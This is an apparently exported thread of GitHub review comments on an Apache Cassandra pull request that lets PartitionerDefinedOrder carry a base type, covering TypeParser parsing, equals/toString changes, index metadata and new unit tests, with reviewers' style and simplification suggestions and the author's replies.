@@ -88,7 +93,8 @@ public Term fromJSONObject(Object parsed)
     @Override
     public String toJSONString(ByteBuffer buffer, ProtocolVersion protocolVersion)
     {
-        throw new UnsupportedOperationException();
+        assert baseType != null && !baseType.equals(this) : ""PartitionerDefinedOrder's toJSONString method need a baseType but now is null or with a not euqal type."";

Review Comment:
   ```suggestion
           assert baseType != null && !baseType.equals(this)
           : ""PartitionerDefinedOrder's toJSONString method needs a baseType but now it is null or with a not equals type."";
   ```



##########
src/java/org/apache/cassandra/db/marshal/PartitionerDefinedOrder.java:
##########
@@ -138,6 +144,38 @@ public TypeSerializer<ByteBuffer> getSerializer()
     @Override
     public String toString()
     {
+        if(baseType != null)
+        {
+            return String.format(""%s(%s:%s)"", getClass().getName(),  partitioner.getClass().getName(), baseType.toString()); 

Review Comment:
   ```suggestion
               return String.format(""%s(%s:%s)"", getClass().getName(),  partitioner.getClass().getName(), baseType); 
   ```



##########
src/java/org/apache/cassandra/db/marshal/PartitionerDefinedOrder.java:
##########
@@ -138,6 +144,38 @@ public TypeSerializer<ByteBuffer> getSerializer()
     @Override
     public String toString()
     {
+        if(baseType != null)

Review Comment:
   ```suggestion
           if (baseType != null)
   ```



##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -131,6 +138,59 @@ public AbstractType<?> parse() throws SyntaxException, ConfigurationException
             return getAbstractType(name);
     }
 
+    /**
+     * parse PartitionOrdering from old version of PartitionOrdering' string format 
+     * */
+    private static  AbstractType<?> defaultParsePartitionOrdering(TypeParser typeParser)

Review Comment:
   ```suggestion
       private static AbstractType<?> defaultParsePartitionOrdering(TypeParser typeParser)
   ```



##########
src/java/org/apache/cassandra/index/internal/CassandraIndex.java:
##########
@@ -735,12 +736,18 @@ public static TableMetadata indexCfsMetadata(TableMetadata baseCfsMetadata, Inde
         ColumnMetadata indexedColumn = target.left;
         AbstractType<?> indexedValueType = utils.getIndexedValueType(indexedColumn);
 
+        AbstractType<?> indexedTablePartitionKeyType =  baseCfsMetadata.partitioner.partitionOrdering();

Review Comment:
   ```suggestion
           AbstractType<?> indexedTablePartitionKeyType = baseCfsMetadata.partitioner.partitionOrdering();
   ```



##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -167,14 +227,14 @@ else if (str.charAt(idx) != ',' && str.charAt(idx) != ')')
         }
         throw new SyntaxException(String.format(""Syntax error parsing '%s' at char %d: unexpected end of string"", str, idx));
     }
-
+    

Review Comment:
   ```suggestion
   
   ```



##########
src/java/org/apache/cassandra/db/marshal/PartitionerDefinedOrder.java:
##########
@@ -18,45 +18,50 @@
 package org.apache.cassandra.db.marshal;
 
 import java.nio.ByteBuffer;
-import java.util.Iterator;
 
-import org.apache.cassandra.config.DatabaseDescriptor;
 import org.apache.cassandra.cql3.Term;
 import org.apache.cassandra.db.DecoratedKey;
 import org.apache.cassandra.db.PartitionPosition;
-import org.apache.cassandra.serializers.TypeSerializer;
-import org.apache.cassandra.serializers.MarshalException;
 import org.apache.cassandra.dht.IPartitioner;
+import org.apache.cassandra.serializers.MarshalException;
+import org.apache.cassandra.serializers.TypeSerializer;
 import org.apache.cassandra.transport.ProtocolVersion;
 import org.apache.cassandra.utils.bytecomparable.ByteComparable;
 import org.apache.cassandra.utils.bytecomparable.ByteComparable.Version;
 import org.apache.cassandra.utils.bytecomparable.ByteSource;
-import org.apache.cassandra.utils.FBUtilities;
+
 
 /** for sorting columns representing row keys in the row ordering as determined by a partitioner.
  * Not intended for user-defined CFs, and will in fact error out if used with such. */
 public class PartitionerDefinedOrder extends AbstractType<ByteBuffer>
 {
     private final IPartitioner partitioner;
-
+    private final AbstractType<?> baseType; 
+    
     public PartitionerDefinedOrder(IPartitioner partitioner)
     {
         super(ComparisonType.CUSTOM);
         this.partitioner = partitioner;
+        this.baseType = null;
+    }
+
+    public PartitionerDefinedOrder(IPartitioner partitioner, AbstractType<?> baseType)
+    {
+        super(ComparisonType.CUSTOM);
+        this.partitioner = partitioner;
+        this.baseType = baseType;
     }
 
     public static AbstractType<?> getInstance(TypeParser parser)
     {
-        IPartitioner partitioner = DatabaseDescriptor.getPartitioner();
-        Iterator<String> argIterator = parser.getKeyValueParameters().keySet().iterator();
-        if (argIterator.hasNext())
-        {
-            partitioner = FBUtilities.newPartitioner(argIterator.next());
-            assert !argIterator.hasNext();
-        }
-        return partitioner.partitionOrdering();
+        return parser.getPartitionerDefinedOrder();
     }
 
+    public AbstractType<?> withBaseType(AbstractType<?> baseType)
+    {
+        return new PartitionerDefinedOrder(this.partitioner, baseType);

Review Comment:
   ```suggestion
           return new PartitionerDefinedOrder(partitioner, baseType);
   ```



##########
src/java/org/apache/cassandra/index/internal/CassandraIndex.java:
##########
@@ -735,12 +736,18 @@ public static TableMetadata indexCfsMetadata(TableMetadata baseCfsMetadata, Inde
         ColumnMetadata indexedColumn = target.left;
         AbstractType<?> indexedValueType = utils.getIndexedValueType(indexedColumn);
 
+        AbstractType<?> indexedTablePartitionKeyType =  baseCfsMetadata.partitioner.partitionOrdering();
+        if(indexedTablePartitionKeyType instanceof PartitionerDefinedOrder)
+        {
+            PartitionerDefinedOrder tmp = (PartitionerDefinedOrder)indexedTablePartitionKeyType;

Review Comment:
   ```suggestion
               PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) indexedTablePartitionKeyType;
   ```



##########
src/java/org/apache/cassandra/index/internal/composites/RegularColumnIndex.java:
##########
@@ -76,7 +76,7 @@ public <T> CBuilder buildIndexClusteringPrefix(ByteBuffer partitionKey,
         // base table partition should be returned for any mathching index entry.
         return builder;
     }
-
+    

Review Comment:
   ```suggestion
   
   ```



##########
src/java/org/apache/cassandra/tools/Util.java:
##########
@@ -335,6 +338,15 @@ public static TableMetadata metadataFromSSTable(Descriptor desc) throws IOExcept
         {
             builder.addClusteringColumn(""clustering"" + (i > 0 ? i : """"), header.getClusteringTypes().get(i));
         }
+        if (SecondaryIndexManager.isIndexColumnFamily(desc.cfname))
+        {
+            String index = SecondaryIndexManager.getIndexName(desc.cfname);
+            // Just set the Kind of index to CUSTOM, which is an irrelevant parameter that does't make any effect on the result

Review Comment:
   ```suggestion
               // Just set the Kind of index to CUSTOM, which is an irrelevant parameter that doesn't make any effect on the result
   ```



##########
test/unit/org/apache/cassandra/SchemaLoader.java:
##########
@@ -390,7 +390,7 @@ public static TableMetadata.Builder staticCFMD(String ksName, String cfName)
                                  .addStaticColumn(""val"", AsciiType.instance)
                                  .addRegularColumn(""val2"", AsciiType.instance);
     }
-
+    

Review Comment:
   ```suggestion
   
   ```



##########
test/unit/org/apache/cassandra/db/marshal/TypeParserTest.java:
##########
@@ -105,4 +109,119 @@ public void testParsePartitionerOrder() throws ConfigurationException, SyntaxExc
         }
         assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
     }
+    
+    @Test
+    public void testParsePartitionerOrderWithBaseType()
+    {
+        // default partitioner
+        assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
+
+        // PartitionerDefinedOrder's base type is not composite type
+        differentBaseTypeValidation(Int32Type.instance);
+        // PartitionerDefinedOrder's base type is  composite type
+        differentBaseTypeValidation(CompositeType.getInstance(Int32Type.instance, UTF8Type.instance));
+        // PartitionerDefinedOrder's base type is  tuple type
+        differentBaseTypeValidation(new TupleType(Lists.newArrayList(Int32Type.instance, UTF8Type.instance)));
+        // PartitionerDefinedOrder's base type is  ReversedType
+        differentBaseTypeValidation(ReversedType.getInstance(Int32Type.instance));
+        // PartitionerDefinedOrder's base type is  CollectionType

Review Comment:
   ```suggestion
           // PartitionerDefinedOrder's base type is CollectionType
   ```



##########
test/unit/org/apache/cassandra/db/marshal/TypeParserTest.java:
##########
@@ -105,4 +109,119 @@ public void testParsePartitionerOrder() throws ConfigurationException, SyntaxExc
         }
         assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
     }
+    
+    @Test
+    public void testParsePartitionerOrderWithBaseType()
+    {
+        // default partitioner
+        assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
+
+        // PartitionerDefinedOrder's base type is not composite type
+        differentBaseTypeValidation(Int32Type.instance);
+        // PartitionerDefinedOrder's base type is  composite type
+        differentBaseTypeValidation(CompositeType.getInstance(Int32Type.instance, UTF8Type.instance));
+        // PartitionerDefinedOrder's base type is  tuple type

Review Comment:
   ```suggestion
           // PartitionerDefinedOrder's base type is tuple type
   ```



##########
test/unit/org/apache/cassandra/SchemaLoader.java:
##########
@@ -252,7 +252,7 @@ public static void schemaDefinition(String testName) throws ConfigurationExcepti
         if (Boolean.parseBoolean(System.getProperty(""cassandra.test.compression"", ""false"")))
             useCompression(schema, compressionParams(CompressionParams.DEFAULT_CHUNK_LENGTH));
     }
-
+    

Review Comment:
   ```suggestion
   
   ```



##########
test/unit/org/apache/cassandra/db/marshal/TypeParserTest.java:
##########
@@ -105,4 +109,119 @@ public void testParsePartitionerOrder() throws ConfigurationException, SyntaxExc
         }
         assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
     }
+    
+    @Test
+    public void testParsePartitionerOrderWithBaseType()
+    {
+        // default partitioner
+        assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
+
+        // PartitionerDefinedOrder's base type is not composite type
+        differentBaseTypeValidation(Int32Type.instance);
+        // PartitionerDefinedOrder's base type is  composite type
+        differentBaseTypeValidation(CompositeType.getInstance(Int32Type.instance, UTF8Type.instance));
+        // PartitionerDefinedOrder's base type is  tuple type
+        differentBaseTypeValidation(new TupleType(Lists.newArrayList(Int32Type.instance, UTF8Type.instance)));
+        // PartitionerDefinedOrder's base type is  ReversedType
+        differentBaseTypeValidation(ReversedType.getInstance(Int32Type.instance));
+        // PartitionerDefinedOrder's base type is  CollectionType
+        differentBaseTypeValidation(MapType.getInstance(Int32Type.instance, UTF8Type.instance, false));
+    }
+
+    @Test
+    public void testParsePartitionerOrderMistMatch()
+    {
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            AbstractType<?> type = partitioner.partitionOrdering();
+            if (type instanceof PartitionerDefinedOrder)
+            {
+                PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) type;
+                type = tmp.withBaseType(Int32Type.instance);
+                boolean result = partitioner.partitionOrdering().equals(TypeParser.parse(type.toString()));
+                assertFalse(result);
+            }
+            else
+            {
+                // ByteOrderedPartitioner.instance and OrderPreservingPartitioner.instance's partitionOrdering will not be PartitionerDefinedOrder
+                boolean result = partitioner.partitionOrdering().equals(TypeParser.parse(type.toString()));
+                assertTrue(result);
+            }
+        }
+
+        assertEquals(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
+    }
+
+    @Test
+    public void testParsePartitionerOrderWithErrorFormat()
+    {
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            AbstractType<?> type = partitioner.partitionOrdering();
+            if (type instanceof PartitionerDefinedOrder)
+            {
+                // only Murmur3Partitioner and RandomPartitioner's partitionOrdering() are instanceof PartitionerDefinedOrder
+                String msgPartitioner = partitioner instanceof Murmur3Partitioner ? ""Murmur3Partitioner"" : ""RandomPartitioner"";
+                // error format PartitionerDefinedOrder(org.apache.cassandra.dht.Murmur3Partitioner,
+                String tmpStr1 =  type.toString().replace(')', ',');
+                try
+                {
+                    TypeParser.parse(tmpStr1);
+                    fail();
+                }
+                catch (Throwable t)
+                {
+                    assertTrue(t.getCause().getMessage().contains(""Syntax error parsing 'org.apache.cassandra.db.marshal.PartitionerDefinedOrder(org.apache.cassandra.dht."" + msgPartitioner + "",: for msg unexpected character ','""));
+                }
+
+                // error format PartitionerDefinedOrder(org.apache.cassandra.dht.Murmur3Partitioner>
+                String tmpStr2 =  type.toString().replace(')', '>');
+                try
+                {
+                    TypeParser.parse(tmpStr2);
+                    fail();
+                }
+                catch (Throwable t)
+                {
+                    assertTrue(t.getCause().getMessage().contains(""Syntax error parsing 'org.apache.cassandra.db.marshal.PartitionerDefinedOrder(org.apache.cassandra.dht."" + msgPartitioner + "">: for msg unexpected character '>'""));
+                }
+
+                // error format PartitionerDefinedOrder(org.apache.cassandra.dht.Murmur3Partitioner>
+                String tmpStr3 =  type.toString().replace(')', ':');
+                try
+                {
+                    TypeParser.parse(tmpStr3);
+                    fail();
+                }
+                catch (Throwable t)
+                {
+                    assertTrue(t.getCause().getMessage().contains(""Unable to find abstract-type class 'org.apache.cassandra.db.marshal.'""));
+                }
+            }
+        }
+        assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
+    }
+
+    private void differentBaseTypeValidation(AbstractType baseType)

Review Comment:
   ```suggestion
       private void differentBaseTypeValidation(AbstractType<?> baseType)
   ```



##########
src/java/org/apache/cassandra/db/marshal/PartitionerDefinedOrder.java:
##########
@@ -138,6 +144,38 @@ public TypeSerializer<ByteBuffer> getSerializer()
     @Override
     public String toString()
     {
+        if(baseType != null)
+        {
+            return String.format(""%s(%s:%s)"", getClass().getName(),  partitioner.getClass().getName(), baseType.toString()); 
+        }
         return String.format(""%s(%s)"", getClass().getName(), partitioner.getClass().getName());
     }
+    
+    public AbstractType<?>  getBaseType() 
+    { 
+        return baseType;
+    }
+
+    @Override
+    public boolean equals(Object obj)
+    {
+        if (this == obj)
+        {
+            return true;
+        }
+        if (obj instanceof PartitionerDefinedOrder)
+        {
+            PartitionerDefinedOrder other = (PartitionerDefinedOrder) obj;
+            if (baseType == null && other.baseType == null)
+            {
+                return this.partitioner.equals(other.partitioner);
+            }
+            else if (baseType != null && other.baseType != null)
+            {
+                return this.baseType.equals(other.baseType) && this.partitioner.equals(other.partitioner);
+            }
+            return false;

Review Comment:
   ```suggestion
               return partitioner.equals(other.partitioner) && Objects.equals(baseType, other.baseType);
   ```



##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -131,6 +138,59 @@ public AbstractType<?> parse() throws SyntaxException, ConfigurationException
             return getAbstractType(name);
     }
 
+    /**
+     * parse PartitionOrdering from old version of PartitionOrdering' string format 
+     * */
+    private static  AbstractType<?> defaultParsePartitionOrdering(TypeParser typeParser)
+    {
+        IPartitioner partitioner = DatabaseDescriptor.getPartitioner();
+        Iterator<String> argIterator = typeParser.getKeyValueParameters().keySet().iterator();
+        if (argIterator.hasNext())
+        {
+            partitioner = FBUtilities.newPartitioner(argIterator.next());
+            assert !argIterator.hasNext();
+        }
+        return partitioner.partitionOrdering();
+    }
+
+    /**
+     * parse and return the real PartitionerDefinedOrder from the string variable str
+     * the str format can be like PartitionerDefinedOrder(<partitioner>) or
+     * PartitionerDefinedOrder(<partitioner>:<baseType>)
+     * */

Review Comment:
   ```suggestion
        * Parse and return the real {@link PartitionerDefinedOrder} from the string variable {@link #str}.
        * The {@link #str} format can be like {@code PartitionerDefinedOrder(<partitioner>)} or
        * {@code PartitionerDefinedOrder(<partitioner>:<baseType>)}.
        */
   ```



##########
src/java/org/apache/cassandra/db/marshal/PartitionerDefinedOrder.java:
##########
@@ -138,6 +144,38 @@ public TypeSerializer<ByteBuffer> getSerializer()
     @Override
     public String toString()
     {
+        if(baseType != null)
+        {
+            return String.format(""%s(%s:%s)"", getClass().getName(),  partitioner.getClass().getName(), baseType.toString()); 
+        }
         return String.format(""%s(%s)"", getClass().getName(), partitioner.getClass().getName());
     }
+    
+    public AbstractType<?>  getBaseType() 

Review Comment:
   ```suggestion
       @Nullable
       public AbstractType<?>  getBaseType()
   ```



##########
src/java/org/apache/cassandra/index/internal/CassandraIndex.java:
##########
@@ -735,12 +736,18 @@ public static TableMetadata indexCfsMetadata(TableMetadata baseCfsMetadata, Inde
         ColumnMetadata indexedColumn = target.left;
         AbstractType<?> indexedValueType = utils.getIndexedValueType(indexedColumn);
 
+        AbstractType<?> indexedTablePartitionKeyType =  baseCfsMetadata.partitioner.partitionOrdering();
+        if(indexedTablePartitionKeyType instanceof PartitionerDefinedOrder)

Review Comment:
   ```suggestion
           if (indexedTablePartitionKeyType instanceof PartitionerDefinedOrder)
   ```



##########
src/java/org/apache/cassandra/index/internal/CassandraIndexFunctions.java:
##########
@@ -183,6 +212,22 @@ public TableMetadata.Builder addIndexClusteringColumns(TableMetadata.Builder bui
             builder.addClusteringColumn(""cell_path"", ((CollectionType)columnDef.type).nameComparator());
             return builder;
         }
+
+        @Override
+        public AbstractType<?> getIndexedPartitionKeyType(ColumnMetadata indexedColumn)
+        {
+            assert indexedColumn.type.isCollection() ;
+            switch (((CollectionType<?>)indexedColumn.type).kind)
+            {
+                case LIST:
+                    return ((ListType<?>)indexedColumn.type).getElementsType();
+                case SET:
+                    return ((SetType<?>)indexedColumn.type).getElementsType();
+                case MAP:
+                    return ((MapType<?, ?>)indexedColumn.type).getValuesType();

Review Comment:
   ```suggestion
               switch (((CollectionType<?>) indexedColumn.type).kind)
               {
                   case LIST:
                       return ((ListType<?>) indexedColumn.type).getElementsType();
                   case SET:
                       return ((SetType<?>) indexedColumn.type).getElementsType();
                   case MAP:
                       return ((MapType<?, ?>) indexedColumn.type).getValuesType();
   ```



##########
src/java/org/apache/cassandra/tools/SSTableExport.java:
##########
@@ -71,8 +72,15 @@
 
     static
     {
-        DatabaseDescriptor.clientInitialization();
-
+        if (Boolean.getBoolean(Util.ALLOW_TOOL_REINIT_FOR_TEST))
+        {
+            DatabaseDescriptor.clientInitialization(false);//Necessary for testing
+        }
+        else 
+        {
+            DatabaseDescriptor.clientInitialization();
+        }

Review Comment:
   ```suggestion
           DatabaseDescriptor.clientInitialization(!Boolean.getBoolean(Util.ALLOW_TOOL_REINIT_FOR_TEST));
   ```



##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -131,6 +138,59 @@ public AbstractType<?> parse() throws SyntaxException, ConfigurationException
             return getAbstractType(name);
     }
 
+    /**
+     * parse PartitionOrdering from old version of PartitionOrdering' string format 
+     * */

Review Comment:
   ```suggestion
        * Parse PartitionOrdering from old version of PartitionOrdering' string format 
        */
   ```



##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -167,14 +227,14 @@ else if (str.charAt(idx) != ',' && str.charAt(idx) != ')')
         }
         throw new SyntaxException(String.format(""Syntax error parsing '%s' at char %d: unexpected end of string"", str, idx));
     }
-
+    
     public List<AbstractType<?>> getTypeParameters() throws SyntaxException, ConfigurationException
     {
         List<AbstractType<?>> list = new ArrayList<>();
 
         if (isEOS())
             return list;
-
+        

Review Comment:
   ```suggestion
   
   ```



##########
test/unit/org/apache/cassandra/db/marshal/TypeParserTest.java:
##########
@@ -105,4 +109,119 @@ public void testParsePartitionerOrder() throws ConfigurationException, SyntaxExc
         }
         assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
     }
+    
+    @Test
+    public void testParsePartitionerOrderWithBaseType()
+    {
+        // default partitioner
+        assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
+
+        // PartitionerDefinedOrder's base type is not composite type
+        differentBaseTypeValidation(Int32Type.instance);
+        // PartitionerDefinedOrder's base type is  composite type

Review Comment:
   ```suggestion
           // PartitionerDefinedOrder's base type is composite type
   ```



##########
test/unit/org/apache/cassandra/db/marshal/TypeParserTest.java:
##########
@@ -105,4 +109,119 @@ public void testParsePartitionerOrder() throws ConfigurationException, SyntaxExc
         }
         assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
     }
+    
+    @Test
+    public void testParsePartitionerOrderWithBaseType()
+    {
+        // default partitioner
+        assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
+
+        // PartitionerDefinedOrder's base type is not composite type
+        differentBaseTypeValidation(Int32Type.instance);
+        // PartitionerDefinedOrder's base type is  composite type
+        differentBaseTypeValidation(CompositeType.getInstance(Int32Type.instance, UTF8Type.instance));
+        // PartitionerDefinedOrder's base type is  tuple type
+        differentBaseTypeValidation(new TupleType(Lists.newArrayList(Int32Type.instance, UTF8Type.instance)));
+        // PartitionerDefinedOrder's base type is  ReversedType
+        differentBaseTypeValidation(ReversedType.getInstance(Int32Type.instance));
+        // PartitionerDefinedOrder's base type is  CollectionType
+        differentBaseTypeValidation(MapType.getInstance(Int32Type.instance, UTF8Type.instance, false));
+    }
+
+    @Test
+    public void testParsePartitionerOrderMistMatch()
+    {
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })

Review Comment:
   This block is repeated four times in this class, we might want to encapsulate it into a method:
   ```java
   private static void assertForEachPartitioner(Consumer<IPartitioner> consumer)
   {
       for (IPartitioner partitioner : new IPartitioner[] { Murmur3Partitioner.instance,
                                                            ByteOrderedPartitioner.instance,
                                                            RandomPartitioner.instance,
                                                            OrderPreservingPartitioner.instance })
       {
           consumer.accept(partitioner);
       }
   }
   ```



##########
test/unit/org/apache/cassandra/db/marshal/TypeParserTest.java:
##########
@@ -105,4 +109,119 @@ public void testParsePartitionerOrder() throws ConfigurationException, SyntaxExc
         }
         assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
     }
+    
+    @Test
+    public void testParsePartitionerOrderWithBaseType()
+    {
+        // default partitioner
+        assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
+
+        // PartitionerDefinedOrder's base type is not composite type
+        differentBaseTypeValidation(Int32Type.instance);
+        // PartitionerDefinedOrder's base type is  composite type
+        differentBaseTypeValidation(CompositeType.getInstance(Int32Type.instance, UTF8Type.instance));
+        // PartitionerDefinedOrder's base type is  tuple type
+        differentBaseTypeValidation(new TupleType(Lists.newArrayList(Int32Type.instance, UTF8Type.instance)));
+        // PartitionerDefinedOrder's base type is  ReversedType

Review Comment:
   ```suggestion
           // PartitionerDefinedOrder's base type is ReversedType
   ```



;01/Feb/23 12:19;githubbot;600","blambov commented on code in PR #2118:
URL: https://github.com/apache/cassandra/pull/2118#discussion_r1093141924


##########
src/java/org/apache/cassandra/db/marshal/PartitionerDefinedOrder.java:
##########
@@ -138,6 +144,38 @@ public TypeSerializer<ByteBuffer> getSerializer()
     @Override
     public String toString()
     {
+        if(baseType != null)
+        {
+            return String.format(""%s(%s:%s)"", getClass().getName(),  partitioner.getClass().getName(), baseType.toString()); 
+        }
         return String.format(""%s(%s)"", getClass().getName(), partitioner.getClass().getName());
     }
+    
+    public AbstractType<?>  getBaseType() 
+    { 
+        return baseType;
+    }
+
+    @Override
+    public boolean equals(Object obj)
+    {
+        if (this == obj)
+        {
+            return true;
+        }
+        if (obj instanceof PartitionerDefinedOrder)
+        {
+            PartitionerDefinedOrder other = (PartitionerDefinedOrder) obj;
+            if (baseType == null && other.baseType == null)

Review Comment:
   Nit: I would make use of `Objects.equals` to simplify these conditionals to
   ```
   return other != null 
       && Objects.equals(this.partitioner, other.partitioner) 
       && Objects.equals(this.baseType, other.baseType);
   ```



##########
src/java/org/apache/cassandra/db/marshal/PartitionerDefinedOrder.java:
##########
@@ -88,7 +93,8 @@ public Term fromJSONObject(Object parsed)
     @Override
     public String toJSONString(ByteBuffer buffer, ProtocolVersion protocolVersion)
     {
-        throw new UnsupportedOperationException();
+        assert baseType != null && !baseType.equals(this) : ""PartitionerDefinedOrder's toJSONString method need a baseType but now is null or with a not euqal type."";

Review Comment:
   Nit: The second part of this assertion does not make sense.
   
   There is no way to construct a type for which `baseType == this`, because `baseType` is passed before `this` is constructed.



##########
src/java/org/apache/cassandra/index/internal/CassandraIndex.java:
##########
@@ -735,12 +736,18 @@ public static TableMetadata indexCfsMetadata(TableMetadata baseCfsMetadata, Inde
         ColumnMetadata indexedColumn = target.left;
         AbstractType<?> indexedValueType = utils.getIndexedValueType(indexedColumn);
 
+        AbstractType<?> indexedTablePartitionKeyType =  baseCfsMetadata.partitioner.partitionOrdering();

Review Comment:
   Is `IPartitioner.partitionOrdering()` used without being followed with `withBaseType()` anywhere now? 
   
   Since this is no longer a patch that will go in older versions, you can change the `IPartitioner` interface to give the base type as a `partitionOrdering` argument, which will remove the need for the special case below and the casts here as well as in `parse`.



##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -131,6 +138,59 @@ public AbstractType<?> parse() throws SyntaxException, ConfigurationException
             return getAbstractType(name);
     }
 
+    /**
+     * parse PartitionOrdering from old version of PartitionOrdering' string format 
+     * */
+    private static  AbstractType<?> defaultParsePartitionOrdering(TypeParser typeParser)
+    {
+        IPartitioner partitioner = DatabaseDescriptor.getPartitioner();
+        Iterator<String> argIterator = typeParser.getKeyValueParameters().keySet().iterator();
+        if (argIterator.hasNext())
+        {
+            partitioner = FBUtilities.newPartitioner(argIterator.next());
+            assert !argIterator.hasNext();
+        }
+        return partitioner.partitionOrdering();
+    }
+
+    /**
+     * parse and return the real PartitionerDefinedOrder from the string variable str
+     * the str format can be like PartitionerDefinedOrder(<partitioner>) or
+     * PartitionerDefinedOrder(<partitioner>:<baseType>)
+     * */
+    public AbstractType<?> getPartitionerDefinedOrder()
+    {
+        int initIdx = idx;
+        skipBlank();
+        if (isEOS())
+            return defaultParsePartitionOrdering(this);
+        if (str.charAt(idx) != '(')
+            throw new IllegalStateException();
+
+        ++idx; // skipping '('
+        skipBlank();
+
+        String k = readNextIdentifier();
+        IPartitioner partitioner = FBUtilities.newPartitioner(k);
+        skipBlank();
+        if (str.charAt(idx) == ':')
+        {
+            ++idx;
+            skipBlank();
+            // must be PartitionerDefinedOrder 
+            PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) partitioner.partitionOrdering();
+            return tmp.withBaseType(parse());
+        }
+        else if (str.charAt(idx) == ')')
+        {
+            idx = initIdx;
+            // if PartitionerDefinedOrder(<partitioner>) then use the original way of parse partitioner Order
+            // for may exist some place we do not know ? or we can just return partitioner.partitionOrdering() here with not initIdx set 
+            return defaultParsePartitionOrdering(this);

Review Comment:
   Since you are already checking that the identifier is followed by `)`, it makes no sense to redo the parsing as `PartitionerDefinedOrder(Partitioner=ignored)` still won't be accepted. Just do `return partitioner.partitionOrdering()` and delete the method above.



;01/Feb/23 12:37;githubbot;600","Maxwell-Guo commented on code in PR #2118:
URL: https://github.com/apache/cassandra/pull/2118#discussion_r1093224212


##########
src/java/org/apache/cassandra/db/marshal/PartitionerDefinedOrder.java:
##########
@@ -88,7 +93,8 @@ public Term fromJSONObject(Object parsed)
     @Override
     public String toJSONString(ByteBuffer buffer, ProtocolVersion protocolVersion)
     {
-        throw new UnsupportedOperationException();
+        assert baseType != null && !baseType.equals(this) : ""PartitionerDefinedOrder's toJSONString method need a baseType but now is null or with a not euqal type."";

Review Comment:
   So I just should remove this second assertion



;01/Feb/23 13:30;githubbot;600","Maxwell-Guo commented on code in PR #2118:
URL: https://github.com/apache/cassandra/pull/2118#discussion_r1093225924


##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -131,6 +138,59 @@ public AbstractType<?> parse() throws SyntaxException, ConfigurationException
             return getAbstractType(name);
     }
 
+    /**
+     * parse PartitionOrdering from old version of PartitionOrdering' string format 
+     * */
+    private static  AbstractType<?> defaultParsePartitionOrdering(TypeParser typeParser)
+    {
+        IPartitioner partitioner = DatabaseDescriptor.getPartitioner();
+        Iterator<String> argIterator = typeParser.getKeyValueParameters().keySet().iterator();
+        if (argIterator.hasNext())
+        {
+            partitioner = FBUtilities.newPartitioner(argIterator.next());
+            assert !argIterator.hasNext();
+        }
+        return partitioner.partitionOrdering();
+    }
+
+    /**
+     * parse and return the real PartitionerDefinedOrder from the string variable str
+     * the str format can be like PartitionerDefinedOrder(<partitioner>) or
+     * PartitionerDefinedOrder(<partitioner>:<baseType>)
+     * */
+    public AbstractType<?> getPartitionerDefinedOrder()
+    {
+        int initIdx = idx;
+        skipBlank();
+        if (isEOS())
+            return defaultParsePartitionOrdering(this);
+        if (str.charAt(idx) != '(')
+            throw new IllegalStateException();
+
+        ++idx; // skipping '('
+        skipBlank();
+
+        String k = readNextIdentifier();
+        IPartitioner partitioner = FBUtilities.newPartitioner(k);
+        skipBlank();
+        if (str.charAt(idx) == ':')
+        {
+            ++idx;
+            skipBlank();
+            // must be PartitionerDefinedOrder 
+            PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) partitioner.partitionOrdering();
+            return tmp.withBaseType(parse());
+        }
+        else if (str.charAt(idx) == ')')
+        {
+            idx = initIdx;
+            // if PartitionerDefinedOrder(<partitioner>) then use the original way of parse partitioner Order
+            // for may exist some place we do not know ? or we can just return partitioner.partitionOrdering() here with not initIdx set 
+            return defaultParsePartitionOrdering(this);

Review Comment:
   yes I agree, as ths comment I left above.



;01/Feb/23 13:32;githubbot;600","Maxwell-Guo commented on code in PR #2118:
URL: https://github.com/apache/cassandra/pull/2118#discussion_r1093227906


##########
src/java/org/apache/cassandra/index/internal/CassandraIndex.java:
##########
@@ -735,12 +736,18 @@ public static TableMetadata indexCfsMetadata(TableMetadata baseCfsMetadata, Inde
